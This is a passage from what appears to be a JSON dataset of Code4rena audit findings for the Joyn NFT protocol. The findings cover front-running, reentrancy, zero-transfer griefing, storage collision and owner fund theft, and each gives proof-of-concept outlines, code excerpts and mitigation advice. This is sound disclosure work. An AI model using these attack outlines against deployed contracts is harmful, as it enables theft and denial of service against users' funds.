(3), so this attack be valid for any royaltyAsset as it is required in Splitter's `incrementWindow` that `splitterShare` be positive.\n\n### Proof of Concept\n\nAs royaltyAsset can be an arbitrary ERC20 it can be reverting on zero value transfers:\n\n<https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers>\n\n`_beforeTokenTransfer` runs `IRoyaltyVault(royaltyVault).sendToSplitter()` whenever royaltyVault is set and have positive balance:\n\n<https://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L307>\n\n`sendToSplitter()` leaves vault balance as exactly zero as `splitterShare = balanceOfVault - platformShare`, i.e. no dust is left behind:\n\n<https://github.com/code-423n4/2022-03-joyn/blob/main/royalty-vault/contracts/RoyaltyVault.sol#L41>\n\nThis way the balance opens up for the tiny amount manipulation.\n\nOne require that can fail the whole operation is `platformShare` transfer:\n\n<https://github.com/code-423n4/2022-03-joyn/blob/main/royalty-vault/contracts/RoyaltyVault.sol#L51-L57>\n\nAnother is positive `royaltyAmount` = `splitterShare` requirement:\n\n<https://github.com/code-423n4/2022-03-joyn/blob/main/splits/contracts/Splitter.sol#L164>\n\n### Recommended Mitigation Steps\n\nThe issue is that token transfer, which is core system operation, require fee splitting to be done on the spot. More failsafe design is to try to send the fees and record the amounts not yet distributed, not requiring immediate success. The logic here is that transfer itself is more important than fee distribution, which is simple enough and can be performed in a variety of ways later.\n\nAnother issue is a combination of direct balance usage and the lack of access controls of the sendToSplitter function, but it only affects fee splitting and is somewhat harder to address.\n\nAs one approach consider trying, but not requiring `IRoyaltyVault(royaltyVault).sendToSplitter()` to run successfully as it can be executed later with the same result.\n\nAnother, a simpler one (the same is in `Griefing attack is possible making Splitter's claimForAllWindows inaccessible` issue), is to introduce action threshold, `MIN_ROYALTY_AMOUNT`, to `sendToSplitter()`, for example:\n\nNow:\n\n    /**\n     * @dev Send accumulated royalty to splitter.\n     */\n    function sendToSplitter() external override {\n        uint256 balanceOfVault = getVaultBalance();\n\n        require(\n            balanceOfVault > 0,\n            \"Vault does not have enough royalty Asset to send\"\n        );\n    \t...\n\n        emit RoyaltySentToSplitter(...);\n        emit FeeSentToPlatform(...);\n    }\n\nTo be:\n\n    /**\n     * @dev Send accumulated royalty to splitter if it's above MIN_ROYALTY_AMOUNT threshold.\n     */\n    function sendToSplitter() external override {\n        uint256 balanceOfVault = getVaultBalance();\n\n        if (balanceOfVault > MIN_ROYALTY_AMOUNT) {\n    \t\t...\n\n    \t    emit RoyaltySentToSplitter(...);\n    \t    emit FeeSentToPlatform(...);\n        }\n    }\n\n**[sofianeOuafir (Joyn) confirmed](https://github.com/code-423n4/2022-03-joyn-findings/issues/37)** \n\n\n***\n\n",
      "summary": "\nA bug report has been filed regarding an attack that can be used to disable CoreCollection token transfers. This attack is possible when the royaltyAsset is an ERC20 that doesn't allow zero amount transfer. The attack can be initiated by Bob the attacker, who sets up a bot that runs the sendToSplitter() function, distributing the whole current royaltyAsset balance of the vault to splitter and platform, so the vault balance becomes zero. This is followed by sending 1 wei of royaltyAsset to the royaltyVault balance. Each next CoreCollection token transfer will then calculate the platformShare, which will be 0 as the platformFee is supposed to be less than 100%. This leads to an attempt to transfer it to the platformFeeRecipient, which will fail if the royaltyAsset reverts on zero amount transfers.\n\nThe severity of this attack is medium, as it is easy to setup and completely blocks token transfers, making the system inoperable. It also requires manual management of user funds, which means additional operational costs and reputational damage. The attack is limited to the zero amount reverting royaltyAsset case or the case when platformFee is set to 100%.\n\nThe recommended mitigation steps for this issue are to try, but not require the IRoyaltyVault(royaltyVault).sendToSplitter() to run successfully, as it can be executed later with the same result. Another approach is to introduce an action threshold, MIN_ROYALTY_AMOUNT, to sendToSplitter(). This will prevent the attack from being successful if the balance is below the threshold.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "https://github.com/code-423n4/2022-03-joyn-findings/issues/37",
      "tags": [],
      "finders": [
        "robee",
        "hyh"
      ]
    },
    {
      "id": "1765",
      "title": "[M-05] Gas costs will likely result in any fees sent to the Splitter being economically unviable to recover.",
      "impact": "MEDIUM",
      "content": "_Submitted by TomFrenchBlockchain_\n\n<https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L161-L163>\n\n<https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L307>\n\n<https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/royalty-vault/contracts/RoyaltyVault.sol#L43-L50>\n\n<https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/Splitter.sol#L149-L169>\n\n### Impact\n\nCollection owners will likely lose money by claiming fees unless the fees from a single NFT sale outweighs the cost of claiming it (not guaranteed).\n\n### Proof of Concept\n\nConsider a new `Collection` with a `RoyaltyVault` and `Splitter` set and a nonzero mint fee.\n\nWhen calling `mintToken`, the `_handlePayment` function is called\n<https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L161-L163>\n\nThis will transfer the minting fee to the `RoyaltyVault` contract.\n\nOn each transfer of an NFT within the collection (for instance in the `_mint` call which occurs directly after calling `_handlePayment`), the `Collection` contract will call `sendToSplitter` on the `RoyaltyVault`:\n\n<https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/core-contracts/contracts/CoreCollection.sol#L307>\n\nThis function will forward the collection owners' portion of the minting on to the `Splitter` contract but another important thing to note is that we call `Splitter.incrementWindow`.\n\n<https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/royalty-vault/contracts/RoyaltyVault.sol#L43-L50>\n\nThis results in the fees newly deposited into the `Splitter` contract being held in a separate \"window\" to the fees from previous or later mints and need to be claimed separately. Remember that this process happens on every NFT sale so the only funds which will be held in this window will be the minting fees for this particular mint.\n\n<https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/Splitter.sol#L149-L169>\n\nFrom this we can see that the `claim` function will only claim the fraction of the fees which are owed to the caller from a single NFT mint.\n\n<https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/Splitter.sol#L112-L142>\n\nNote that we can attempt to claim from multiple windows in a single transaction using `claimForAllWindow` but as the name suggests it performs an unbounded loop trying to claim all previous windows (even ones which have already been claimed!) and it is likely that with a new window for every NFT sold this function will exceed the gas limit (consider an 10k token collection resulting in trying to do 10k SSTOREs at 20k gas each.), leaving us to claim each window individually with `claim`.\n\n<https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/splits/contracts/Splitter.sol#L35-L62>\n\nWe're then forced to claim the royalties from each NFT sold one by one, having to send huge numbers of calls to `claim` incurring the base transaction cost many times over and performing many ERC20 transfers when we could have just performed one.\n\nCompound on this that this needs to be repeated by everyone included in the split, multiplying the costs of claiming.\n\nMedium risk as it's gas inefficiency to the point of significant value leakage where collection owners will lose a large fraction of their royalties.\n\n### Recommended Mitigation Steps\n\nIt doesn't seem like the \"window\" mechanism does anything except raise gas costs to the extent that it will be very difficult to withdraw fees so it should be removed.\n\n**[sofianeOuafir (Joyn) confirmed and commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/27#issuecomment-1099551627):**\n > This is a very fair point and we'll consider fixing this issue.\n\n**[deluca-mike (judge) commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/27#issuecomment-1105984197):**\n > Aside from the very valid points made by the warden, it seems that the heavy functions called from the `_beforeTokenTransfer` also create a lot of friction for the NFT owners. Might make more sense to have royalty splitting happen asynchronously from NFT transfers (i.e. let the cost of splitting be the burden of royalty stakeholders, not NFT holders).\n> \n> If NFT transferring becomes too costly, someone could make a \"de-joyn\" contract which can \"re-tokenize\" NFTs sent to it, so that they can be transferred without having to worry about `_beforeTokenTransfer` (or royalties, for that matter).\n> \n> See Recommended Mitigation Steps in #37 for more info.\n\n\n\n***\n\n",
      "summary": "\nThis bug report concerns the code in the GitHub repository code-423n4/2022-03-joyn. It describes a vulnerability in the Collection, RoyaltyVault, and Splitter contracts that could result in collection owners losing money by claiming fees. The issue occurs when a new Collection is created with a RoyaltyVault and Splitter set and a nonzero mint fee. When calling the mintToken function, the _handlePayment function is called which transfers the minting fee to the RoyaltyVault contract. On each transfer of an NFT within the collection, the Collection contract will call sendToSplitter on the RoyaltyVault. This will forward the collection owners' portion of the minting on to the Splitter contract. However, this also calls Splitter.incrementWindow which results in the fees newly deposited into the Splitter contract being held in a separate \"window\" to the fees from previous or later mints and need to be claimed separately. This means that the only funds which will be held in this window will be the minting fees for this particular mint. The issue is that the claim function will only claim the fraction of the fees which are owed to the caller from a single NFT mint. This means that to claim the fees, the collection owners will need to send multiple calls to the claim function incurring the base transaction cost many times over and performing many ERC20 transfers when they could have just performed one. This is a medium risk vulnerability as it is gas inefficiency to the point of significant value leakage. The recommended mitigation steps are to remove the \"window\" mechanism as it does not seem to provide any benefit and only serves to raise gas costs.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "https://github.com/code-423n4/2022-03-joyn-findings/issues/27",
      "tags": [],
      "finders": [
        "TomFrenchBlockchain"
      ]
    },
    {
      "id": "1764",
      "title": "[M-04] createProject can be frontrun",
      "impact": "MEDIUM",
      "content": "_Submitted by wuwe1, also found by defsec, and kirk-baird_\n\nThis is dangerous in scam senario because the malicious user can frontrun and become the owner of the collection. As owner, one can withdraw `paymentToken`. (note that \\_collections.isForSale can be change by frontrunner)\n\n### Proof of Concept\n\n1.  Anyone can call `createProject`.\n\n<https://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreFactory.sol#L70-L77>\n\n```solidity\n  function createProject(\n    string memory _projectId,\n    Collection[] memory _collections\n  ) external onlyAvailableProject(_projectId) {\n    require(\n      _collections.length > 0,\n      'CoreFactory: should have more at least one collection'\n    );\n```\n\n### Recommended Mitigation Steps\n\nTwo ways to mitigate.\n\n1.  Consider use white list on project creation.\n2.  Ask user to sign their address and check the signature against `msg.sender`.  <https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol#L102>\n\n\n**[sofianeOuafir (Joyn) confirmed and commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/26#issuecomment-1099700412):**\n > This is an issue and we intend to fix it!\n\n**[deluca-mike (judge) commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/26#issuecomment-1105980217):**\n > The solutions listed in #34 and #35 are better.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the CoreFactory Solidity contract, which can be found on GitHub at the link provided. The vulnerability could allow a malicious user to become the owner of a collection and withdraw paymentToken, as the collections.isForSale can be changed by the frontrunner. The malicious user could do this by calling the createProject function. \n\nTo mitigate this vulnerability, two solutions are proposed. The first is to consider using a white list on project creation. The second is to ask the user to sign their address and check the signature against the msg.sender. This solution can be found on the OpenZeppelin Contracts GitHub page.",
      "quality_score": 3,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "https://github.com/code-423n4/2022-03-joyn-findings/issues/26",
      "tags": [
        "Front-Running"
      ],
      "finders": [
        "kirk-baird",
        "wuwe1",
        "defsec"
      ]
    },
    {
      "id": "1763",
      "title": "[M-03] `RoyaltyVault.sol` is Not Equipped to Handle On-Chain Royalties From Secondary Sales",
      "impact": "MEDIUM",
      "content": "_Submitted by leastwood_\n\n<https://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol>\n\n<https://github.com/code-423n4/2022-03-joyn/blob/main/royalty-vault/contracts/RoyaltyVault.sol>\n\n### Impact\n\nThe Joyn documentation mentions that Joyn royalty vaults should be equipped to handle revenue generated on a collection's primary and secondary sales. Currently, `CoreCollection.sol` allows the collection owner to receive a fee on each token mint, however, there is no existing implementation which allows the owner of a collection to receive fees on secondary sales.\n\nAfter discussion with the Joyn team, it appears that this will be gathered from Opensea which does not have an on-chain royalty mechanism. As such, each collection will need to be added manually on Opensea, introducing further centralisation risk. It is also possible for users to avoid paying the secondary fee by using other marketplaces such as Foundation.\n\n### Recommended Mitigation Steps\n\nConsider implementing the necessary functionality to allow for the collection of fees through an on-chain mechanism. `ERC2981` outlines the appropriate behaviour for this.\n\n\n**[sofianeOuafir (Joyn) confirmed and commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/130#issuecomment-1099679515):**\n > This is a great observation. Something we are aware of and intend to fix as well. ðŸ‘ \n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in the Joyn documentation which states that Joyn royalty vaults should be equipped to handle revenue generated on a collection's primary and secondary sales. Currently, `CoreCollection.sol` allows the collection owner to receive a fee on each token mint, but there is no existing implementation which allows the owner of a collection to receive fees on secondary sales. After discussion with the Joyn team, it appears that this will be gathered from Opensea which does not have an on-chain royalty mechanism. This introduces further centralisation risk and users can avoid paying the secondary fee by using other marketplaces such as Foundation. \n\nTo address this, it is recommended to implement the necessary functionality to allow for the collection of fees through an on-chain mechanism. `ERC2981` outlines the appropriate behaviour for this.",
      "quality_score": 3,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "https://github.com/code-423n4/2022-03-joyn-findings/issues/130",
      "tags": [
        "Royalty",
        "ERC2981"
      ],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "1762",
      "title": "[M-02] Fixed Amount of Gas Sent in Call May Be Insufficient",
      "impact": "MEDIUM",
      "content": "_Submitted by kirk-baird_\n\n### Impact\n\nThe function `attemptETHTransfer()` makes a call with a fixed amount of gas, 30,000. If the receiver is a contract this may be insufficient to process the `receive()` function. As a result the user would be unable to receive funds from this function.\n\n### Proof of Concept\n\n        function attemptETHTransfer(address to, uint256 value)\n            private\n            returns (bool)\n        {\n            // Here increase the gas limit a reasonable amount above the default, and try\n            // to send ETH to the recipient.\n            // NOTE: This might allow the recipient to attempt a limited reentrancy attack.\n            (bool success, ) = to.call{value: value, gas: 30000}(\"\");\n            return success;\n        }\n\n### Recommended Mitigation Steps\n\nConsider removing the `gas` field to use the default amount and protect from reentrancy by using reentrancy guards and the [check-effects-interaction pattern](https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html). Note this pattern is already applied correctly.\n\n\n**[sofianeOuafir (Joyn) confirmed and commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/8#issuecomment-1100121921):**\n > This is an issue we want to investigate and fix if needed\n\n**[deluca-mike (judge) commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/8#issuecomment-1105949579):**\n > Consider that changes to the network could result in re-pricing of opcodes which can make:\n> - opcodes less expensive, which would re-introduce the opportunity for re-entrancy that the old costs prevented\n> - opcodes more expensive, which would break this function altogether\n> \n> If `attemptETHTransfer` is the only way to extract ETH stored in this contract, then an Ethereum upgrade could result in lost funds. Luckily, as long as [access lists](https://eips.ethereum.org/EIPS/eip-2930) remain in the protocol, a route would exist to recover and/or restore functionality.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the function `attemptETHTransfer()` in the Splitter.sol file. This function makes a call with a fixed amount of gas, 30,000. If the receiver is a contract, this amount of gas may be insufficient to process the `receive()` function, which would prevent the user from receiving funds. To mitigate this issue, the `gas` field should be removed to use the default amount and reentrancy guards should be used. The check-effects-interaction pattern should also be applied to protect from reentrancy.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "https://github.com/code-423n4/2022-03-joyn-findings/issues/8",
      "tags": [],
      "finders": [
        "kirk-baird"
      ]
    },
    {
      "id": "1761",
      "title": "[M-01] DoS: Attacker May Front-Run `createSplit()` With A `merkleRoot` Causing Future Transactions With The Same `merkleRoot` to Revert",
      "impact": "MEDIUM",
      "content": "_Submitted by kirk-baird_\n\nA `merkleRoot` may only be used once in `createSplit()` since it is used as `salt` to the deployment of a `SplitProxy`.\n\nThe result is an attacker may front-run any `createSplit()` transaction in the mem pool and create another `createSplit()` transaction with a higher gas price that uses the same `merkleRoot` but changes the other fields such as the `_collectionContract` or `_splitAsset()`.  The original transaction will revert and the user will not be able to send any more transaction with this `merkleRoot`.\n\nThe user would therefore have to generate a new merkle tree with different address, different allocations or a different order of leaves in the tree to create a new merkle root. However, the attack is repeateable and there is no guarantee this new merkle root will be successfully added to a split without the attacker front-running the transaction again.\n\n### Proof of Concept\n\nThe excerpt from `createSplitProxy()` shows the `merkleRoot()` being used as a `salt`.\n\n      splitProxy = address(\n        new SplitProxy{salt: keccak256(abi.encode(merkleRoot))}()\n      );\n\n### Recommended Mitigation Steps\n\nAs seems to be the case here if the transaction address does NOT need to be known ahead of time consider removing the `salt` parameter from the contract deployment.\n\nOtherwise, if the transaction address does need to be known ahead of time then consider concatenating `msg.sender` to the `merkleRoot`. e.g.\n\n    splitProxy = address(\n        new SplitProxy{salt: keccak256(abi.encode(msg.sender, merkleRoot))}()\n      )\n\n**[sofianeOuafir (Joyn) confirmed and commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/33#issuecomment-1099702622):**\n > This is an issue and intend to fix it\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue with the `createSplit()` transaction in the `SplitFactory.sol` code. The `merkleRoot` used as a `salt` to the deployment of a `SplitProxy` is only allowed to be used once. This makes it possible for an attacker to front-run any `createSplit()` transaction in the mem pool and create another `createSplit()` transaction with a higher gas price that uses the same `merkleRoot` but changes the other fields such as the `_collectionContract` or `_splitAsset()`. This causes the original transaction to revert and the user will not be able to send any more transaction with this `merkleRoot`. \n\nThe recommended mitigation steps are to either remove the `salt` parameter from the contract deployment if the transaction address does not need to be known ahead of time, or to concatenate `msg.sender` to the `merkleRoot` if the transaction address does need to be known ahead of time.",
      "quality_score": 3,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "https://github.com/code-423n4/2022-03-joyn-findings/issues/33",
      "tags": [
        "Front-Running"
      ],
      "finders": [
        "kirk-baird"
      ]
    },
    {
      "id": "1760",
      "title": "[H-09] ERC20 tokens with no return value will fail to transfer",
      "impact": "HIGH",
      "content": "_Submitted by ych18, also found by wuwe1_\n\n<https://github.com/code-423n4/2022-03-joyn/blob/main/royalty-vault/contracts/RoyaltyVault.sol#L43-L46>\n\n<https://github.com/code-423n4/2022-03-joyn/blob/main/royalty-vault/contracts/RoyaltyVault.sol#L51-L57>\n\n### Vulnerability details\n\nAlthough the ERC20 standard suggests that a transfer should return true on success, many tokens are non-compliant in this regard (including high profile, like USDT) . In that case, the .transfer() call here will revert even if the transfer is successful, because solidity will check that the RETURNDATASIZE matches the ERC20 interface.\n\n### Recommendation\n\nConsider using OpenZeppelinâ€™s SafeERC20\n\n**[sofianeOuafir (Joyn) confirmed and commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/83#issuecomment-1099512222):**\n > duplicate of #52 \n\n**[deluca-mike (judge) commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/83#issuecomment-1153004716):**\n > Actually not a duplicate of #52, since it pertains to return data size handling causing an issue, rather than failure to handle a true/false return at all. Still, same solution (use SafeERC20).\n\n\n\n***\n\n \n",
      "summary": "\nThis bug report is about a vulnerability in the RoyaltyVault smart contract, which is part of the 2022-03-joyn project. The vulnerability is related to the ERC20 standard, which suggests that a transfer should return true on success. However, many tokens are non-compliant with this, including high profile tokens such as USDT. In this case, the .transfer() call in the RoyaltyVault contract will revert even if the transfer is successful, because solidity will check that the RETURNDATASIZE matches the ERC20 interface.\n\nThe recommendation given in the report is to consider using OpenZeppelinâ€™s SafeERC20, which is a library that provides a safe version of the ERC20 token standard. This library has been designed to handle the non-compliant tokens, and can help ensure that the .transfer() call in the RoyaltyVault contract will not revert when transferring non-compliant tokens.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "https://github.com/code-423n4/2022-03-joyn-findings/issues/83",
      "tags": [],
      "finders": [
        "ych18",
        "wuwe1"
      ]
    },
    {
      "id": "1759",
      "title": "[H-08] Funds cannot be withdrawn in `CoreCollection.withdraw`",
      "impact": "HIGH",
      "content": "_Submitted by ych18, also found by hickuphh3 and WatchPug_\n\nThe `CoreCollection.withdraw` function uses `payableToken.transferFrom(address(this), msg.sender, amount)` to transfer tokens from the `CoreCollection` contract to the `msg.sender` ( who is the owner of the contract). The usage of `transferFrom` can result in serious issues. In fact, many ERC20 always require that in `transferFrom` `allowance[from][msg.sender] >= amount`, so in this case the call to the `withdraw` function will revert as the `allowance[CoreCollection][CoreCollection] == 0` and therefore the funds cannot ben withdrawn and will be locked forever in the contract.\n\n### Recommendation\nReplace `transferFrom` with `transfer`\n\n\n**[sofianeOuafir (Joyn) confirmed and commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/80#issuecomment-1100089878):**\n > duplicate of #52 \n\n**[deluca-mike (judge) commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/80#issuecomment-1153003850):**\n > This is not a duplicate, as it pertains to the wrong use of transfer vs transferFrom, which can have implications regarding required allowances.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the `CoreCollection.withdraw` function in the `CoreCollection.sol` file. The function uses `payableToken.transferFrom(address(this), msg.sender, amount)` to transfer tokens from the `CoreCollection` contract to the `msg.sender`. This can cause serious issues as many ERC20 tokens require that `allowance[from][msg.sender] >= amount` in order to be transferred. In this case, the `allowance[CoreCollection][CoreCollection] == 0` and the funds will be locked forever in the contract. \n\nThe recommendation is to replace `transferFrom` with `transfer` in order to avoid this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "https://github.com/code-423n4/2022-03-joyn-findings/issues/80",
      "tags": [],
      "finders": [
        "hickuphh3  WatchPug",
        "ych18"
      ]
    },
    {
      "id": "1758",
      "title": "[H-07] Duplicate NFTs Can Be Minted if `payableToken` Has a Callback Attached to it",
      "impact": "HIGH",
      "content": "_Submitted by leastwood_\n\n<https://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/CoreCollection.sol#L139-L167>\n\n<https://github.com/code-423n4/2022-03-joyn/blob/main/core-contracts/contracts/ERC721Payable.sol#L50-L56>\n\n### Impact\n\nThe `mintToken()` function is called to mint unique tokens from an `ERC721` collection. This function will either require users to provide a merkle proof to claim an airdropped token or pay a fee in the form of a `payableToken`. However, because the `payableToken` is paid before a token is minted, it may be possible to reenter the `mintToken()` function if there is a callback attached before or after the token transfer. Because `totalSupply()` has not been updated for the new token, a user is able to bypass the `totalSupply() + amount <= maxSupply` check. As a result, if the user mints the last token, they can reenter and mint duplicate NFTs as the way `tokenId` is generated will wrap around to the start again.\n\n### Proof of Concept\n\nFor the sake of this example, let's say `startingIndex = 0` and `maxSupply = 100`. `tokenId` is minted according to `((startingIndex + totalSupply()) % maxSupply) + 1`. If we see that a user mints a token where `totalSupply() = maxSupply - 1 = 99` and they reenter the function, then the next token to mint will actually be of index `1` as `totalSupply() % maxSupply = 0`. Calculating the first `tokenId`, we get `((0 + 0) % maxSupply) + 1 = 1` which is a duplicate of our example.\n\n### Recommended Mitigation Steps\n\nConsider adding reentrancy protections to prevent users from abusing this behaviour. It may also be useful to follow the checks-effects pattern such that all external/state changing calls are made at the end.\n\n\n**[sofianeOuafir (Joyn) confirmed and commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/121#issuecomment-1099689645):**\n > This is an issue we intend to investigate and fix if indeed it is an issue\n\n**[deluca-mike (judge) commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/121#issuecomment-1106037774):**\n > This is a valid high risk issue. Also, for reference, the checks-effects-interactions (CEI) pattern suggests you, in this order:\n> - perform checks that something can be done\n> - perform the effects (update storage and emit events)\n> - interact with other functions/contracts (since you may not be sure they will call out and re-enter)\n\n\n\n***\n\n",
      "summary": "\nA bug report has been submitted for the `mintToken()` function in the `CoreCollection.sol` and `ERC721Payable.sol` contracts. This function is called to mint unique tokens from an `ERC721` collection and requires either a merkle proof to claim an airdropped token or a payment in the form of a `payableToken`. The bug occurs when a user is able to reenter the `mintToken()` function if there is a callback attached before or after the token transfer. As the `totalSupply()` has not been updated for the new token, a user is able to bypass the `totalSupply() + amount <= maxSupply` check. This allows the user to mint duplicate NFTs as the way `tokenId` is generated will wrap around to the start again. \n\nTo prevent this vulnerability, the developer should consider adding reentrancy protections and follow the checks-effects pattern such that all external/state changing calls are made at the end.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "https://github.com/code-423n4/2022-03-joyn-findings/issues/121",
      "tags": [],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "1757",
      "title": "[H-06] STORAGE COLLISION BETWEEN PROXY AND IMPLEMENTATION (LACK EIP 1967)",
      "impact": "HIGH",
      "content": "_Submitted by peritoflores_\n\nStorage collision because of lack of EIP1967 could cause conflicts and override sensible variables\n\n### Proof of Concept\n\n    contract CoreProxy is Ownable {\n           address private immutable _implement;\n\nWhen you implement proxies, logic and implementation share the same storage layout.    In order to avoid storage conflicts  EIP1967 was proposed.(<https://eips.ethereum.org/EIPS/eip-1967>)   The idea is to set proxy variables at fixed positions (like  `impl` and `admin` ).\n\nFor example, according to the standard,  the slot for for logic address should be\n\n`0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc` (obtained as `bytes32(uint256(keccak256('eip1967.proxy.implementation')) - 1)`  ).\n\nIn this case, for example, as you inherits from `Ownable` the variable \\_owner is at the first slot and can be overwritten in the implementation.   There is a table at OZ site that explains this scenario more in detail\n\n<https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies>\n\nsection  \"Unstructured Storaged Proxies\"\n\n\n### Recommended Mitigation Steps\n\nConsider using EIP1967\n\n\n**[sofianeOuafir (Joyn) confirmed and commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/108#issuecomment-1099710973):**\n > This is an issue we want to investigate and fix if our investigation suggests we indeed need to make improvement on that end.\n> \n> At the same time, I have little idea of what is the impact of this issue. I'm not sure if it's a high risk item\n\n**[deluca-mike (judge) commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/108#issuecomment-1106035099):**\n > Impact would be that an upgrade could brick a contract by simply rearranging inheritance order, or adding variables to an inherited contract, since the implantation slot will not be where it is expected. As the warden suggests, its critical that the implementation slot be fixed at an explicit location, and not an implicit location derived purely from inheritance and declaration order.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a storage collision that could occur when implementing proxies. This collision can cause conflicts and override sensible variables. To prevent this, EIP1967 was proposed. This would set proxy variables at fixed positions. For example, according to the standard, the slot for logic address should be a specific hexadecimal value. To explain this scenario in more detail, the OpenZeppelin site provides a table under the section \"Unstructured Storaged Proxies\". The tools used to detect this vulnerability were manual code review. The recommended mitigation step is to consider using EIP1967.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "https://github.com/code-423n4/2022-03-joyn-findings/issues/108",
      "tags": [
        "Inheritance"
      ],
      "finders": [
        "peritoflores"
      ]
    },
    {
      "id": "1756",
      "title": "[H-05] Centralisation RIsk: Owner Of `RoyaltyVault` Can Take All Funds",
      "impact": "HIGH",
      "content": "_Submitted by kirk-baird, also found by 0xDjango, defsec, Dravee, hubble, hyh, leastwood, minhquanym, Ruhum, TomFrenchBlockchain, and WatchPug_\n\nThe owner of `RoyaltyVault` can set `_platformFee` to any arbitrary value (e.g. 100% = 10000) and that share of the contracts balance and future balances will be set to the `platformFeeRecipient` (which is in the owners control) rather than the splitter contract.\n\nAs a result the owner can steal the entire contract balance and any future balances avoiding the splitter.\n\n### Proof of Concept\n\n        function setPlatformFee(uint256 _platformFee) external override onlyOwner {\n            platformFee = _platformFee;\n            emit NewRoyaltyVaultPlatformFee(_platformFee);\n        }\n\n### Recommended Mitigation Steps\n\nThis issue may be mitigated by add a maximum value for the `_platformFee` say 5% (or some reasonable value based on the needs of the platform).\n\nAlso consider calling `sendToSplitter()` before adjusting the `platformFee`. This will only allow the owner to change the fee for future value excluding the current contract balance.\n\nConsider the following code.\n\n        function setPlatformFee(uint256 _platformFee) external override onlyOwner {\n            require(_platformFee < MAX_FEE);\n            sendToSplitter(); // @audit this will need to be public rather than external\n            platformFee = _platformFee;\n            emit NewRoyaltyVaultPlatformFee(_platformFee);\n        }\n\n\n**[sofianeOuafir (Joyn) confirmed and commented](https://github.com/code-423n4/2022-03-joyn-findings/issues/9#issuecomment-1099594175):**\n > This is an issue 